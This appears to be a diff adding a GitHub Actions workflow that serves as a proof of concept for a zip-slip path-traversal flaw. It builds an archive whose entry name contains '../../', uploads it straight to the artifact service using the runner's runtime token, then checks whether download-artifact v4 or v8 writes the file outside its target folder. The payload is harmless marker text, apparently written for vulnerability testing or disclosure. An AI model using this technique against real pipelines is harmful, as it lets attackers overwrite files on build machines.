@@ -1,0 +1,64 @@
+name: artifact-traversal-poc
+on: workflow_dispatch
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: STEP 1 - build a zip whose entry name embeds ..
+        run: |
+          echo "=== STEP 1: BUILD ARTIFACT ==="
+          python3 - <<'EOF'
+          import zipfile
+          z=zipfile.ZipFile('/tmp/poc.zip','w',zipfile.ZIP_DEFLATED)
+          z.writestr('inside.txt','LANDS_INSIDE_THE_PATH\n')
+          z.writestr('a/../../escaped.txt','LANDS_OUTSIDE_THE_PATH\n')
+          z.close()
+          EOF
+          python3 -c "import zipfile;print('entries:',zipfile.ZipFile('/tmp/poc.zip').namelist())"
+      - name: STEP 2 - upload via the artifact service
+        uses: actions/github-script@v7
+        with:
+          script: |
+            core.info("=== STEP 2: UPLOAD ARTIFACT ===");
+            const fs=require('fs'), crypto=require('crypto');
+            const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
+            const cl=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
+            const m=(cl.scp||"").match(/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i);
+            const ids={workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]};
+            const c=await (await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
+              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
+               body:JSON.stringify({...ids,name:"poc-art",version:4})})).json();
+            const data=fs.readFileSync('/tmp/poc.zip'); const blk=Buffer.from("b1").toString('base64');
+            await fetch(c.signed_upload_url+"&comp=block&blockid="+blk,{method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:data});
+            await fetch(c.signed_upload_url+"&comp=blocklist",{method:"PUT",headers:{"Content-Type":"application/xml"},
+              body:'<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+blk+'</Latest></BlockList>'});
+            const sha=crypto.createHash('sha256').update(data).digest('hex');
+            core.info("upload finalize http=" + (await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact",
+              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
+               body:JSON.stringify({...ids,name:"poc-art",size:data.length,hash:"sha256:"+sha})})).status);
+  consume_v4:
+    needs: produce
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== STEP 3: v4 DOWNLOAD ==="
+          mkdir -p /home/runner/work/t4/dl
+      - uses: actions/download-artifact@v4
+        with: { name: poc-art, path: /home/runner/work/t4/dl }
+      - run: |
+          echo "=== STEP 4: WHERE FILES LANDED (v4) ==="
+          find /home/runner/work/t4 -type f | sed 's|^|  |'
+          test -f /home/runner/work/t4/escaped.txt && echo "V4 RESULT=ESCAPED_THE_PATH" || echo "V4 RESULT=contained"
+  consume_v8:
+    needs: produce
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "=== STEP 5: v8 CONTROL DOWNLOAD ==="
+          mkdir -p /home/runner/work/t8/dl
+      - uses: actions/download-artifact@v8
+        with: { name: poc-art, path: /home/runner/work/t8/dl }
+      - run: |
+          echo "=== STEP 6: WHERE FILES LANDED (v8 CONTROL) ==="
+          find /home/runner/work/t8 -type f | sed 's|^|  |'
+          test -f /home/runner/work/t8/escaped.txt && echo "V8 RESULT=ESCAPED_THE_PATH" || echo "V8 RESULT=contained"
